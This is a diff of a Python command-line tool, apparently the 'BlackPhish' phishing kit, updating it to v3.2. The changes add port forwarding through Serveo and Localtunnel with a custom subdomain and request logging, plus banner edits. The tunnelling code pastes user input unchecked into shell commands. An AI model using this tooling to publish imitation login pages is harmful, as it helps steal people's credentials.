@@ -10,9 +10,9 @@
 
 
 
-# Lasted updated: 1/21/20
+# Lasted updated: 1/26/20
 
-# version 3.1: - Code Revisions - Added Twitter
+# version 3.2: - Bug fixes and improvements
 
 # Please update version number each time we update
 
@@ -74,7 +74,7 @@ def warning(): # Banner #
           ███▀▀▀██▄                        ████████▀ 
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
-        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v3.1
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v3.2
         
                 
                     Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
@@ -111,9 +111,7 @@ def checkInternet(): # Checks for internet connection #
 # Port forward to Serveo #
 def serveoForward():
     name = input(yellow + "\nCustom Domain Name(don't need www. or domain extension): ")
-    port = input(yellow + "\nPort[default 80]: ")
-    if not port:
-        port = "80"
+    port = input(yellow + "\nPort[recommended 80]: ")
     print(yellow + '\n If prompt about RSA key, say yes' + green)
     sleep(2)
     system('ssh -o ServerAliveInterval=60 -R ' + name + ':' + port + ':localhost:' + port + ' serveo.net')
@@ -122,7 +120,11 @@ def serveoForward():
 
 # Port forward with Localtunnel #
 def localTunnel():
-    system('lt -p 80 --allow-invalid-cert')
+    name = input(yellow + "\nCustom Domain Name(don't need www. or domain extension): ")
+    port = input(yellow + "\nPort[recommended 80]: ")
+    print(yellow + '\n If prompt about RSA key, say yes' + green)
+    sleep(2)
+    system('lt -p ' + port + ' -s ' + name + ' --allow-invalid-cert --print-requests')
 
 
 
@@ -170,7 +172,7 @@ def banner():
           ███▀▀▀██▄                        ████████▀ 
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
-        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v3.1
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v3.2
         
                 
                     Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
